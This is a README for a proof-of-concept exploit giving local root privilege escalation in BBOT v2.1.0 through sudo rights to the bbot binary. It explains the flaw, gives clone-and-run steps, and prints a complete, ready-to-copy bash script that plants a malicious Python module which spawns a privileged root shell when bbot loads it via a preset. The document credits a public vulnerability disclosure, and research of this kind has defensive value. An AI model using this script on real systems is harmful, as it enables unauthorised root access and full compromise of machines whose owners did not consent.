# BBOT v2.1.0 - Local Privilege Escalation

<br><br>
<div align="center">
  <img width="200" src="https://www.blacklanternsecurity.com/bbot/Stable/bbot.png" alt="bbot-logo"> <br><br>
  <p>BBOT v2.1.0<br>
  <b>Local Privilege Escalation to Root</b> <br>
  PoC Exploit<br>
  </p>
<img src="https://www.zyenra.com/assets/img/bbot-poc-exploit-2.png">
</div>


---

### Introduction

`BBOT` version 2.1.0 allows local root privilege escalation when `sudo` rights are granted to `/usr/local/bin/bbot`.  
By injecting a malicious module and referencing it through a preset, arbitrary Python code runs as root during module loading.

This bypasses all sandboxing due to `bbot` trusting unvalidated local modules and loading them with root permissions.

---

### Usage

```bash
git clone https://github.com/rvizx/bbot-privesc
cd bbot-privesc
chmod +x exploit.sh

# usage
./exploit.sh
```


---

<div align="center"> <br> <b>OR</b> <br><br> </div>


---

Copy the following exploit code
```bash
#!/usr/bin/env bash

# Title  : BBOT v2.1.0 - Local Privilege Escalation - PoC Exploit
# Author : Ravindu Wickramasinghe (aka rvz)
# Usage  : usage: ./exploit.sh

set -e
D="/tmp/.x"; M="x.py"; P="p.yml"; N="x"

trap 'rm -rf "$D"' EXIT

mkdir -p "$D"

cat > "$D/$M" <<EOF
from bbot.modules.base import BaseModule
import pty
class $N(BaseModule):
 async def setup(self): pty.spawn(["/bin/bash", "-p"])
EOF

cat > "$D/$P" <<EOF
description: x
module_dirs: [$D]
modules: [$N]
EOF

sudo /usr/local/bin/bbot -t x -p "$D/$P" --event-types ROOT || true
```

Save copied content to `exploit.sh` and execute
```
chmod +X exploit.sh
./exploit.sh
```


<be>
<b>Note:</b> This exploit requires `NOPASSWD` sudo access to `/usr/local/bin/bbot`.

---

### Credits

Original Vulnerability Disclosure [Link](https://seclists.org/fulldisclosure/2025/Apr/19) - Discovered by Housma Mardini <br>
PoC Exploit at [Link](https://github.com/rvizx/bbot-privesc) - Ravindu Wickramasinghe AKA rvz
